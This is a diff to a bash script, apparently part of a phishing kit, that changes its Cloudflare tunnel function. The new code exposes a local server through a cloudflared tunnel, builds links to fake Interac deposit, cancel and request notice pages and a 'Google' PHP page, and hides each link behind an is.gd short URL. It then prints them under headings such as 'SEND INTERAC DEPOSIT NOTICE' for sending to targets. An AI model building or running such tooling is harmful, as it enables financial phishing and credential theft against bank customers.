@@ -557,13 +557,12 @@ ngrok_start_manual() {
 
 
 
-
 # Start Cloudflared
 cloudflared_start() { 
 	
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
+	echo -e ""
 	{ sleep 1; setup_clone; }
-	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
+	echo -ne "${MAGETNA}"
 
     if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
@@ -572,18 +571,30 @@ cloudflared_start() {
     fi
 
 	{ sleep 12; clear; header; }
-	
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
-	cldflr_url1=${cldflr_url#https://}
-	
-	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
-	
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
-	
-	credentials
+cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+url_1="${cldflr_url}/public/deposit/1.html"
+url_2="${cldflr_url}/public/deposit/2.html"
+url_3="${cldflr_url}/public/deposit/3.html"
+url_4="${cldflr_url}/public/Google/GO.php"
+url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
+url2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_2")
+url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
+url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC DEPOSIT NOTICE "
+echo -e "${WHITE}$url1"
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC  CANCEL NOTICE"
+echo -e "${YELLOW}$url2"
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC REQUEST NOTICE"
+echo -e "${YELLOW}$url3"
+echo -e "${WHITE}==================================="
+echo -e "${RED}CREATE A GOOGLE LINK "
+echo -e "${YELLOW}$url4"
+echo -e "${WHITE}==================================="
+
+
 }
 
 
